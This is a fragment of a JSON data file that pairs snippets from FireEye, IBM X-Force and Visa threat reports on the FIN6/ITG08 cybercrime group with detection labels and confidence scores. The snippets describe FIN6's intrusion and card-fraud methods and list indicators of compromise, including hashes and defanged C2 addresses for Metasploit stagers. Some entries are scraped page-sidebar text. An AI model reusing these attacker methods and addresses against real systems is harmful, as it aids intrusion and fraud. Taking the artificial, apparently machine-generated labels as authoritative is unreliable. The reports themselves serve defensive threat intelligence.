+            "confidence": 0.6552024483680725
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We have identified stolen data from several of \nFIN6\u2019s victims being sold by this vendor as far \nback as 2014.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5659178495407104
+        },
+        "prediction": {}
+    },
+    {
+        "text": "This connection means that data \nstolen by FIN6 has almost certainly ended up in \nthe hands of fraud operators across the world, \nas they buy and exploit payment cards from \nthe underground shop.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6498770117759705
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In each case, the stolen \ndata began appearing in the shop within six \nmonths of the FIN6 breach. While the amount \nof data sold through the shop varies by breach, \nin some cases more than 10 million cards \nassociated with a specific FIN6-linked breach \nhave been identified on the shop. After being \nposted, much of the stolen card data is quickly \npurchased for exploitation. Along with the \ndata we have linked to FIN6, this underground \nshop has sold data from millions of other cards, \nwhich may be linked to breaches perpetrated \nby other threat actors. \n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.46090880036354065
+        },
+        "prediction": {}
+    },
+    {
+        "text": "SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nUNDERGROUND COMMUNITIES DEALING IN STOLEN CARD DATA EXIST ACROSS THE \nworld and are a major facilitator of money laundering operations.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.705241322517395
+        },
+        "prediction": {}
+    },
+    {
+        "text": "A large number of these \ncommunities take the form of illicit e-commerce sites called \u201ccard shops\u201d or \u201cdump shops\u201d \n(criminals refer to stolen card-present transaction data as \u201cdumps\u201d). These shops allow \ntheir clientele to use a web-based platform to sort through data on thousands or millions of \npayment cards and purchase exactly the types they want based on their money laundering \ncapabilities. These data are then added to the client\u2019s cart for checkout, similar to a legitimate \nwebsite.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5622702836990356
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Subsequently, customers use the card information they have purchased for many \ndifferent money laundering schemes, such as buying and reselling gift cards or electronics.\n Our analysis of the data sold through this \nunderground vendor indicates that FIN6\u2019s \ncompromises are highly profitable to the actors \ninvolved, potentially resulting in extensive fraud \nlosses. For instance, in one FIN6-linked breach \nthe vendor was advertising nearly than 20 \nmillion cards.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5308241248130798
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These cards were predominantly \nfrom the United States and selling for an \naverage of $21. So the total return for the shop \n\u2014 if all the data was sold at full price \u2014 could \nhave been about $400 million. \n In reality, the shop would typically only make \na fraction of this figure since not all the data \nwould be sold (laundering stolen cards is \ntypically much harder than stealing them), \nbuyers want the newest data they can get (data \nthat has been on the shop for a while loses its \nvalue) and the shop offers discounts based \non various criteria.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.47068944573402405
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In turn, cyber \ncriminals purchasing the data would expect \nto make more than they paid for the cards \nby conducting fraudulent transactions using \nthose cards. \n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6945274472236633
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Not all of the data sold on this particular card \nshop has been tied to an identified compromise \nor specific cyber criminal group. Additionally, as \nis often the case with prominent cyber criminal \nvendors, it is not yet clear how the operators \nof the underground site are linked to the actors \nwho steal the data the shop sells. The vendor \nhas sold large amounts of card data with \nvaried characteristics, so it is possible the shop \noperators maintain relationships with more \nthan one data provider. FIN6 members could \ninclude some of the operators behind this shop; \nalternately, FIN6 could be selling stolen data to \nthe operators of this site. \n SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \na combination of factors.",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.345813512802124
+        },
+        "prediction": {}
+    },
+    {
+        "text": "It requires \nvisibility into the threat landscape, \nincluding both a broad view (the ability to \nidentify activity across a range of countries, \nindustries and organizations) and a deep view \n(the ability to gather detailed information \nabout how threat actors operate). It also \nrequires skilled analysts who are able to \nreview, fuse and understand the available data.\n In this case, the combined intelligence from \nFireEye, Mandiant and iSIGHT intelligence \nteams was able to not only identify malicious \nactivity aimed at stealing payment card \ndata, but also provide a detailed window \ninto that activity from compromise through \nmonetization of the stolen data.\n The story of FIN6 shows how real-world threat \nactors operate, providing a glimpse not only \ninto the technical details of the compromise, \nbut also into the human factor as well; namely, \nthe interactions between different criminals \nor criminal groups, and how it is not just data \nbeing bartered or sold in the underground, but \nalso tools, credentials and access.\n",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.4183642864227295
+        },
+        "prediction": {}
+    },
+    {
+        "text": "SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 \nTo download this or other  \nFireEye Threat Intelligence reports, \nvisit: www.fireeye.com/reports.html\nFireEye, Inc.  \n1440 McCarthy Blvd. Milpitas, CA 95035  \n408.321.6300 / 877.FIREEYE (347.3393) /",
+        "source": "rpt-fin6.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5020266175270081
+        },
+        "prediction": {}
+    },
+    {
+        "text": "IBM X-Force Incident Response and Intelligence Services (IRIS) responds to security incidents across the globe. During a recent incident response investigation, our team identified new attacks by the financially motivated attack group ITG08, also known as FIN6.\n ITG08 is an organized cybercrime gang that has been active since 2015, mostly targeting point-of-sale (POS) machines in brick-and-mortar retailers and companies in the hospitality sector in the U.S. and Europe. More recently, the group has been observed targeting e-commerce environments by injecting malicious code into online checkout pages of compromised websites \u2014 a technique known as online skimming \u2014 thereby stealing payment card data transmitted to the vendor by unsuspecting customers.\n Based on our investigation and analysis of its adversarial tactics, techniques and procedures (TTPs), we believe ITG08 is actively attacking multinational organizations, targeting specific employees with spear phishing emails advertising fake job advertisements and repeatedly deploying the More_eggs JScript backdoor malware (aka Terra Loader, SpicyOmelette). This tool, a TTP observed in ITG08 attacks since 2018, is sold on the dark web by an underground malware-as-a-service (MaaS) provider.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.22461049258708954
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In the campaign we investigated, the attackers employed additional TTPs historically associated with ITG08, including the use of Windows Management Instrumentation (WMI) to automate the remote execution of PowerShell scripts, PowerShell commands with base64 encoding, and Metasploit and PowerShell to move laterally and deploy malware. Lastly, the attackers used Comodo code-signing certificates several times during the course of the campaign.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5497539043426514
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Many of the above TTPs are not unique to ITG08, but collectively, and with the use of More_eggs, strengthen the link to this group.\n ",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6175340414047241
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Let\u2019s take a closer look at ITG08\u2019s TTPs that are relevant to the campaign we investigated, starting with its spear phishing and intrusion tactics and covering information on its use of the More_eggs backdoor.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6519942879676819
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Please note that Visa has attributed the use of this backdoor to FIN6 in attacks that took place in 2018.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.664161741733551
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Further linking the activity with the same threat actor, several of the network indicators and TTPs we encountered in this case \u2014 including the use of fake job advertisements as a lure in spear phishing \u2014 overlap with those reported earlier in 2019 by both Visa and Proofpoint researchers.\n ",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6866626739501953
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The following sections go over the steps taken by the attackers to gain an initial foothold and persist on the victimized organization\u2019s networks.\n ",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7819309234619141
+        },
+        "prediction": {}
+    },
+    {
+        "text": "To gain access to victim environments, the threat actor began by targeting handpicked employees using LinkedIn messaging and email, advertising fake jobs to lure recipients into checking into the supposed offers. In one case, we uncovered evidence indicating that the attacker had established communication with a victim via email and convinced them to click on a Google Drive URL purporting to contain an attractive job advert.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5893581509590149
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Once clicked, the URL displayed the message, \u201cOnline preview is not available,\u201d then presented a second URL leading to a compromised or rogue domain, where the victim could download the payload under the guise of a job description:\n12 min read - As of December 2023, IBM X-Force has uncovered multiple lure documents that predominately feature the ongoing Israel-Hamas war to facilitate the delivery of the ITG05 exclusive Headlace backdoor.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5777189135551453
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The newly discovered campaign is directed against targets based in at least\u2026\n4 min read - Though they may initially seem very different, there are some compelling similarities between cybersecurity professionals and traditional first responders like police and EMTs.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6226325035095215
+        },
+        "prediction": {}
+    },
+    {
+        "text": "After all, in a world where a cyberattack on critical infrastructure could cause untold damage and harm,\u2026\n3 min read - On October 30, 2023, President Biden issued an executive order (EO) to set new standards for the safety and security of Artificial Intelligence (AI). The move sets out the government\u2019s intentions to regulate and further advance the growth of AI\u2026\n8 min read - IBM X-Force discovered a new variant of Gootloader \u2014 the \"GootBot\" implant \u2014 which facilitates stealthy lateral movement and makes detection and blocking of Gootloader campaigns more difficult within enterprise environments.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4949157238006592
+        },
+        "prediction": {}
+    },
+    {
+        "text": "X-Force observed these campaigns leveraging SEO poisoning, wagering on unsuspecting victims' search activity, which we analyze further in the blog.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6172094345092773
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The Gootloader group\u2019s introduction of their own custom bot into the late stages of their attack chain is an attempt to avoid detections when using off-the-shelf tools for C2\u2026\n4 min read - You may recall my previous blog post about how our X-Force veteran threat hunter Neil Wyler (a.k.a \u201cGrifter\u201d) discovered nation-state attackers exfiltrating unencrypted, personally identifiable information (PII) from a company\u2019s network, unbeknownst to the security team.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.550349235534668
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Before you can embark on a threat hunting exercise, however, it\u2019s important to understand how to build, implement and mature a repeatable, internal threat hunting program.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5827391743659973
+        },
+        "prediction": {}
+    },
+    {
+        "text": "What are the components\u2026\n4 min read - Shopping online is an increasingly popular endeavor, and it has accelerated since the COVID-19 pandemic.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6585604548454285
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Online sales during the 2021 holiday season rose nearly 9% to a record $204.5 billion. Mastercard says that shopping jumped 8.5% this year compared to 2020 and 61.4% compared to pre-pandemic levels.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5858641266822815
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The Ramnit Trojan, in particular, is out for a shopping spree that\u2019s designed to take over people\u2019s online accounts and steal their payment card data. IBM\u2026\n12 min read - One of the benefits of being part of a global research-driven incident response firm like X-Force Incidence Response (IR) is that the team has the ability to take a step back and analyze incidents, identifying trends and commonalities that span geographies, industries and affiliations. Leveraging that access and knowledge against the ransomware threat has revealed tools, techniques and procedures that can often be detected through the default Windows event logs (WELs). In particular, the X-Force IR team has identified several\u2026\nAnalysis and insights from hundreds of the brightest minds in the cybersecurity industry to help you prove compliance, grow business and stop threats.",
+        "source": "More_eggs, Anyone_ Threat Actor ITG08 Strikes Again.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3778131604194641
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The past two years have borne witness to the increasing collaboration between organized cybercrime groups to avoid duplication of efforts and maximize profits.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7051395773887634
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Although this collaboration has primarily occurred between gangs developing and distributing well-known banking Trojans, such as Emotet, TrickBot and IcedID, it does not stop there. In a new and dangerous twist to this trend, IBM X-Force Incident Response and Intelligence Services (IRIS) research believes that the elite cybercriminal threat actor ITG08, also known as FIN6, has partnered with the malware gang behind one of the most active Trojans \u2014 TrickBot \u2014 to use TrickBot\u2019s new malware framework dubbed \u201cAnchor\u201d against organizations for financial profit.\n",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3375944495201111
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The Anchor malware framework itself is not new and its origins date back to at least 2018.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6865206360816956
+        },
+        "prediction": {}
+    },
+    {
+        "text": "It appears to be tightly connected to TrickBot and is likely programmed by the same malware authors that work on TrickBot. Cybersecurity firms SentinelOne and Cybereason have published reports in recent months describing Anchor as new malware developed by the TrickBot gang for use in targeted attacks against enterprises, including a new PowerShell-based backdoor called PowerTrick.\n ITG08/FIN6 is an organized cybercrime gang that has been active since 2015, primarily targeting point-of-sale (POS) machines in brick-and-mortar retailers and companies in the hospitality sector across the U.S. and Europe. TrickBot is a banking Trojan that emerged in 2016 and has since grown to be one of the top, and most sophisticated, Trojans being used by organized cybercrime gangs believed to be hailing out of Russia.\n In the past six months, the Anchor backdoor malware, which includes a variant that communicates over DNS (Anchor_DNS), has been used in targeted attacks on enterprise networks \u2014 including POS systems \u2014 following initial infection by the TrickBot Trojan.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3527577817440033
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The way organizations are being attacked ties with typical ITG08 activity reported throughout the past few years.\n",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7564762830734253
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Through connecting our own findings with information from other security research reports, X-Force IRIS has determined that the threat actor ITG08 has partnered with the TrickBot gang to use that group\u2019s PowerTrick and Anchor backdoor malware for attacks on high-profile targets.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6067022681236267
+        },
+        "prediction": {}
+    },
+    {
+        "text": "12 min read - As of December 2023, IBM X-Force has uncovered multiple lure documents that predominately feature the ongoing Israel-Hamas war to facilitate the delivery of the ITG05 exclusive Headlace backdoor.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6172781586647034
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The newly discovered campaign is directed against targets based in at least\u2026\n4 min read - Though they may initially seem very different, there are some compelling similarities between cybersecurity professionals and traditional first responders like police and EMTs.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6226325035095215
+        },
+        "prediction": {}
+    },
+    {
+        "text": "After all, in a world where a cyberattack on critical infrastructure could cause untold damage and harm,\u2026\n3 min read - On October 30, 2023, President Biden issued an executive order (EO) to set new standards for the safety and security of Artificial Intelligence (AI). The move sets out the government\u2019s intentions to regulate and further advance the growth of AI\u2026\n8 min read - IBM X-Force discovered a new variant of Gootloader \u2014 the \"GootBot\" implant \u2014 which facilitates stealthy lateral movement and makes detection and blocking of Gootloader campaigns more difficult within enterprise environments.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4949157238006592
+        },
+        "prediction": {}
+    },
+    {
+        "text": "X-Force observed these campaigns leveraging SEO poisoning, wagering on unsuspecting victims' search activity, which we analyze further in the blog.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6172094345092773
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The Gootloader group\u2019s introduction of their own custom bot into the late stages of their attack chain is an attempt to avoid detections when using off-the-shelf tools for C2\u2026\n4 min read - You may recall my previous blog post about how our X-Force veteran threat hunter Neil Wyler (a.k.a \u201cGrifter\u201d) discovered nation-state attackers exfiltrating unencrypted, personally identifiable information (PII) from a company\u2019s network, unbeknownst to the security team.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.550349235534668
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Before you can embark on a threat hunting exercise, however, it\u2019s important to understand how to build, implement and mature a repeatable, internal threat hunting program.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5827391743659973
+        },
+        "prediction": {}
+    },
+    {
+        "text": "What are the components\u2026\n4 min read - Shopping online is an increasingly popular endeavor, and it has accelerated since the COVID-19 pandemic.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6585604548454285
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Online sales during the 2021 holiday season rose nearly 9% to a record $204.5 billion. Mastercard says that shopping jumped 8.5% this year compared to 2020 and 61.4% compared to pre-pandemic levels.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5858641266822815
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The Ramnit Trojan, in particular, is out for a shopping spree that\u2019s designed to take over people\u2019s online accounts and steal their payment card data. IBM\u2026\n12 min read - One of the benefits of being part of a global research-driven incident response firm like X-Force Incidence Response (IR) is that the team has the ability to take a step back and analyze incidents, identifying trends and commonalities that span geographies, industries and affiliations. Leveraging that access and knowledge against the ransomware threat has revealed tools, techniques and procedures that can often be detected through the default Windows event logs (WELs). In particular, the X-Force IR team has identified several\u2026\nAnalysis and insights from hundreds of the brightest minds in the cybersecurity industry to help you prove compliance, grow business and stop threats.",
+        "source": "ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3778131604194641
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Visa Public \nVisa Payment Fraud Disruption  \nFIN6 Cybercrime Group Expands Threat to eCommerce \nMerchants \nFIN6 is a financially motivated threat actor group in operation since at least 2015.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5618043541908264
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The group has \ncompromised multiple point-of-sale (POS) environments using the TRINITY POS (aka FrameworkPOS) \nmalware. In September 2017, forensic investigations of several undisclosed entities revealed evidence that \nFIN6 actors changed to target card-not-present (CNP) data when they could not deploy their malware in \nthe POS environment. Evidence shows that FIN6 injected malicious code into the merchants\u2019 eCommerce \nenvironment, placing skimming malware on the victims\u2019 checkout pages. Based on Visa Payment Fraud \nDisruption\u2019s (PFD) analysis of eCommerce compromises throughout 2018, FIN6\u2019s focus on the CNP \nenvironment has only amplified, suggesting that the cybercrime group has fully incorporated \ntargeting CNP environments into their criminal methodology.  \n The majority of eCommerce compromises reported in 2018 involved direct targeting of vulnerabilities \nwithin the eCommerce website itself. As one of the more sophisticated groups targeting eCommerce \nmerchants, FIN6 brings their POS compromise approach to the emerging threat landscape of CNP \nbreaches. FIN6 targets companies, using phishing emails in an attempt to infect the targeted victim\u2019s \nnetwork.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.2865319550037384
+        },
+        "prediction": {}
+    },
+    {
+        "text": "PFD \nassesses that the increased focus of a sophisticated cybercrime group, such as FIN6, on eCommerce \nenvironments is a broader representation of the overall cybercriminal focus on the CNP space.  \n At the end of 2018, Visa Payment Intelligence analysts discovered that FIN6 actors targeted multiple high \nvalue eCommerce merchants with malicious documents that contained links to a malicious server that \nallowed the execution of PowerShell scripts, granting the attackers direct access to the merchants\u2019 \nnetworks.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5659282207489014
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The PowerShell scripts were only present in memory, and did not download additional files to \nthe user\u2019s machine, making it difficult for the victim to detect. The FIN6 actors were able to utilize this \naccess to move through the merchant\u2019s networks to access the eCommerce environment, and specifically \nthe payment servers. A full investigation of these compromises show that the FIN6 actors specifically \ntargeted the eCommerce networks and did not exploit them opportunistically. \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6306760311126709
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Visa Public \nVisa Payment Fraud Disruption  \nFigure 1 - FIN6 eCommerce Attack Flow \nInitial Compromise \nFIN6 employs a multitude of tactics within the initial phase of their operations.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6071884632110596
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In the most recent \ncompromises attributed to FIN6, forensic investigators identified the use of malicious documents to infect \nvictims with malware known as More_Eggs (aka Terra Loader) that is used to launch malicious scripts on \nthe infected machine. \n ",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6921183466911316
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Maintain Access \nFIN6 establishes a foothold within a victim\u2019s environment by leveraging various payloads, such as \ncomponents of the Metasploit Framework (e.g., Meterpreter, JSPSPY and CmdSQL), or through a \nVisa Public \nVisa Payment Fraud Disruption  \nspecialized version of the AMMYY remote administration tool (RAT) known as FlawedAmmyy.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.49300917983055115
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In the most \nrecent cases, attackers then establish persistent access to the victim\u2019s network using Meterpreter related \ncode, allowing the attackers to maintain a remote connection to the infected system. \n ",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.7336009740829468
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Internal Reconnaissance \nFIN6 uses legitimate publicly available tools to map the internal network and conduct reconnaissance. \n ",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.7175584435462952
+        },
+        "prediction": {}
+    },
+    {
+        "text": "During the reconnaissance phase, the actors gather information on systems running SQL Database Server \ninstances and dump schemas for multiple databases and SQL user accounts. The actors also target \nnetwork credentials using a malware family known as Stealer One (see below in the section Technical \nAnalysis and Indicators of Compromise).",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6478439569473267
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Additionally, FIN6 employs legitimate administrative tools, such as: \n\u2022  Microsoft's built-in SQL querying tool (osql.exe) \n\u2022  Query Express (a free, portable graphical SQL client) \n\u2022   AdFind (a free command-line tool for querying Active Directory)  \n\u2022    ProcDump (a Microsoft SysInternals command-line utility used to perform analysis of running \nEscalate Privileges \nOnce FIN6\u2019s accesses are established with preferred backdoors, they use additional public utilities, such as \nWindows Credentials Editor and Metasploit-related tools, for privilege escalation and credential harvesting.  \n  Move Laterally/Maintain Presence \nCapitalizing on data acquired via internal reconnaissance, FIN6 relies on credentials stolen from various \nsystems (e.g. usernames and password hashes) for lateral movement. Investigations show that FIN6 relies \non PowerShell scripts and Meterpreter based shells to maintain access to and move laterally through the \nnetwork (see below in the section Technical Analysis and Indicators of Compromise). \n ",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.2869952917098999
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Visa Public \nVisa Payment Fraud Disruption  \nTechnical Analysis and Indicators of Compromise (IOCs)  \nMalicious Files \u2013 Stealer One \nStealer One is a credential stealer, first observed by industry forensic investigators in March 2017.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5447670221328735
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The \nmalware targets a variety of applications, including email clients, web browsers, FTP clients, and other file \ntransfer utilities. \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6140274405479431
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Stealer One (aka SONE or InfoStealer) Malware \nSignature verification: Signed file, verified signature \nSigning date: 03/05/2018 \nSigners: 223647473 (MJO TM LTD) \nCertificate SHA-1 Thumbprint: \nE1E086A9B6C1614470A94A515AEA1D372E1640A9 \nCertificate Serial Number: 56 E1 98 80 2B 37 C7 09 54 81 67 2B 7B 58 21 F4 \nStealer One (aka SONE or InfoStealer) Malware \nVisa discovered seven other files on VirusTotal which are signed with the same \"223647473 (MJO TM LTD)\" \ncertificate, suggesting these files are controlled by the same cybercrime group. \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.31667184829711914
+        },
+        "prediction": {}
+    },
+    {
+        "text": "e1bf80ef5fb111b087b8c172a38c0b23  More_Eggs (aka Terra Loader) Malware (Bot Version - 3.0) \nb4dcb80246769a6b291a4c7e98a380bd  More_Eggs (aka Terra Loader)   Malware \ne526722fdd276e56fdd932f3d0e72cbb \nMetasploit Shellcode Loader 94.130.52[.]230:443 \nStealer One (aka SONE or InfoStealer) Malware  \nVisa Public \nVisa Payment Fraud Disruption  \nVisa analyzed a number of encoded PowerShell commands identified in recent FIN6 activity and \ndetermined the majority are related to Metasploit activity, including: \nMetasploit Bind TCP Stager (different local ports were observed) \nMetasploit Reverse TCP Stager \u2013 46.4.113[.]237:443 \nMetasploit Reverse HTTPS Stager \u2013 185.154.52[.]140:443 \nVisa Public \nVisa Payment Fraud Disruption  \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.2052876204252243
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In addition to the C2 information provided, which can change, below are some network IOCs that can be \nused to detect More_Eggs beaconing out of the network: \n0BConnectivity Check \n The malware checks network connectivity by sending an HTTP HEAD (GET in some new \nversions) request to the following legitimate URL:  \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6459488868713379
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The malware issues an HTTP GET request to the following Google public DNS IP, which takes a \nfew seconds to complete, causing the program to pause its activity temporarily.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.7173768281936646
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Visa recommends clients take the following actions to mitigate against these threats: \n Institute recurring checks in local networks for IOCs provided in this report.  \n\u2022  Verify the implementation of required security patches: Payment Card Industry Data Security \nStandard (PCI DSS) requires that all system components and software are protected from known \nvulnerabilities by installing security patches. Visit the Payment Card Industry Security Standards \nCouncil (PCI SSC) website for more information.   \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5247069597244263
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Hire a trusted \nprofessional or service provider with a reputation of security to secure the eCommerce \nenvironment.",
